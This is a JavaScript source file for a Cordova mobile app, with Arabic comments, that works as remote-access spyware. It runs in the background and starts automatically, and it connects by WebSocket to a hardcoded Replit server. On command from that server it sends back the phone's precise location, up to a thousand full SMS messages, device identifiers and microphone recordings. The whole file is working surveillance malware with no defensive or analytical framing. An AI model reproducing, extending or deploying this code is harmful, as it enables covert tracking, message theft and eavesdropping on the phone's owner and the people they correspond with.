document.addEventListener('deviceready', onDeviceReady, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];
let audioDuration = 10; // القيمة الافتراضية لمدة التسجيل

function onDeviceReady() {
  console.log('Device is ready');
  
  // طلب الأذونات اللازمة
  requestPermissions();
  
  // تمكين التشغيل في الخلفية
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
    cordova.plugins.backgroundMode.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'جارٍ مراقبة الأوامر الواردة',
      silent: false
    });
    
    // إعداد العمل في الخلفية
    cordova.plugins.backgroundMode.on('activate', function() {
      cordova.plugins.backgroundMode.disableWebViewOptimizations();
      console.log('Running in background');
    });
  }

  // بدء التشغيل التلقائي
  if (cordova.plugins.autoStart) {
    cordova.plugins.autoStart.enable();
    console.log('Auto start enabled');
  }

  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      
      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }

  // إعداد واجهة المستخدم
  setupUI();
}

function setupUI() {
  // إضافة واجهة اختيار مدة التسجيل
  const audioDurationSelect = `
    <div style="margin: 10px; padding: 10px; background: #f5f5f5; border-radius: 5px;">
      <label for="audioDuration">مدة التسجيل (ثانية): </label>
      <select id="audioDuration" onchange="setAudioDuration(this.value)">
        <option value="10">10</option>
        <option value="20">20</option>
        <option value="30">30</option>
        <option value="60">60</option>
      </select>
    </div>
  `;
  
  // إضافة منطقة لعرض التسجيلات
  const audioPlayerSection = `
    <div id="audioPlayerSection" style="margin: 10px; padding: 10px; display: none;">
      <h3>التسجيلات الصوتية</h3>
      <audio id="audioPlayer" controls style="width: 100%;"></audio>
      <button onclick="downloadAudio()" style="margin-top: 10px; padding: 10px; background: #4CAF50; color: white; border: none; border-radius: 5px;">
        تنزيل التسجيل
      </button>
    </div>
  `;
  
  // إضافة العناصر إلى body
  document.body.innerHTML += audioDurationSelect + audioPlayerSection;
}

function setAudioDuration(duration) {
  audioDuration = parseInt(duration);
  console.log('تم تحديد مدة التسجيل: ' + audioDuration + ' ثانية');
}

function requestPermissions() {
  // طلب إذن الموقع
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      () => console.log('تم منح إذن الموقع'),
      (error) => console.error('خطأ في إذن الموقع:', error),
      { enableHighAccuracy: true }
    );
  }
  
  // طلب إذن التسجيل الصوتي
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ audio: true })
      .then(() => console.log('تم منح إذن التسجيل الصوتي'))
      .catch(error => console.error('خطأ في إذن التسجيل الصوتي:', error));
  }
  
  // طلب إذن الرسائل (إذا كان Plugin موجود)
  if (typeof SMS !== 'undefined') {
    SMS.listSMS({}, 
      () => console.log('تم منح إذن الرسائل'),
      (error) => console.error('خطأ في إذن الرسائل:', error)
    );
  }
}

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    
    // تسجيل الجهاز
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        // تخزين الطلب المستلم
        receivedRequests.push({
          ...data.command,
          receivedAt: new Date().toISOString()
        });
        
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, (response) => {
          if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response: {
                ...response,
                requestData: data.command // إضافة بيانات الطلب الأصلي للرجوع إليها
              }
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
      
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    // إعادة الاتصال بعد تأخير
    setTimeout(() => connectToServer(deviceInfo), 10000);
  };
  
  // إرسال نبضات قلبية دورية
  const heartbeatInterval = setInterval(() => {
    if (wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        timestamp: new Date().toISOString(),
        receivedRequests // إرسال سجل الطلبات المستلمة
      }));
    } else {
      clearInterval(heartbeatInterval);
    }
  }, 30000);
}

function executeCommand(command, callback) {
  console.log('Executing command:', command);
  
  // إضافة commandId للتعقب
  const commandId = Date.now();
  
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration || audioDuration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    case 'download_sms':
      downloadSmsAsTxt(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };
      
      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 1000, // زيادة الحد الأقصى للرسائل
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body, // عرض النص الكامل بدون قص
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

function downloadSmsAsTxt(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 1000,
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      try {
        // إنشاء محتوى الملف النصي
        let txtContent = "رسائل SMS\n\n";
        messages.forEach((msg, index) => {
          txtContent += `رسالة ${index + 1}:\n`;
          txtContent += `المرسل: ${msg.address}\n`;
          txtContent += `التاريخ: ${new Date(msg.date).toLocaleString('ar-SA')}\n`;
          txtContent += `المحتوى: ${msg.body}\n`;
          txtContent += "------------------------\n\n";
        });
        
        // إنشاء blob من المحتوى
        const blob = new Blob([txtContent], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        
        // حفظ الملف مؤقتاً
        const fileName = `sms_messages_${new Date().getTime()}.txt`;
        
        callback({
          commandId,
          status: 'success',
          file: {
            name: fileName,
            type: 'text/plain',
            size: blob.size,
            downloadUrl: url,
            content: txtContent
          }
        });
      } catch (error) {
        callback({ 
          commandId,
          status: 'error',
          error: 'Failed to create SMS file',
          details: error.message
        });
      }
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

function recordAudio(commandId, duration, callback) {
  duration = duration || audioDuration; // استخدام المدة المحددة
  
  const mediaRecorderOptions = {
    mimeType: 'audio/webm; codecs=opus', // استخدام صيغة متوافقة
    audioBitsPerSecond: 128000
  };
  
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];
      
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
        const audioUrl = URL.createObjectURL(audioBlob);
        
        // حفظ التسجيل في التخزين المحلي
        const fileName = `recording_${commandId}.webm`;
        saveAudioToStorage(fileName, audioBlob);
        
        // عرض التسجيل في الواجهة
        displayAudioPlayer(audioUrl);
        
        callback({ 
          commandId,
          status: 'success',
          audio: {
            duration: duration,
            format: 'webm',
            size: audioBlob.size,
            downloadUrl: audioUrl,
            fileName: fileName
          }
        });
      };
      
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, duration * 1000);
    })
    .catch(error => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

function displayAudioPlayer(audioUrl) {
  const audioPlayerSection = document.getElementById('audioPlayerSection');
  const audioPlayer = document.getElementById('audioPlayer');
  
  audioPlayer.src = audioUrl;
  audioPlayerSection.style.display = 'block';
}

function downloadAudio() {
  const audioPlayer = document.getElementById('audioPlayer');
  const source = audioPlayer.src;
  
  if (source) {
    const a = document.createElement('a');
    a.href = source;
    a.download = `audio_recording_${new Date().getTime()}.webm`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }
}

function saveAudioToStorage(fileName, blob) {
  // حفظ الملف في التخزين المحلي
  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
    dir.getFile(fileName, { create: true }, fileEntry => {
      fileEntry.createWriter(fileWriter => {
        fileWriter.onwriteend = () => console.log('Audio file saved:', fileName);
        fileWriter.onerror = e => console.error('Error saving file:', e);
        fileWriter.write(blob);
      });
    });
  });
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests,
    count: receivedRequests.length
  });
}

// إعادة الاتصال عند استئناف التطبيق
document.addEventListener('resume', () => {
  if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
    console.log('App resumed, reconnecting...');
    onDeviceReady();
  }
}, false);

// عند إغلاق التطبيق، التأكد من بقائه يعمل في الخلفية
document.addEventListener('pause', () => {
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
  }
}, false);
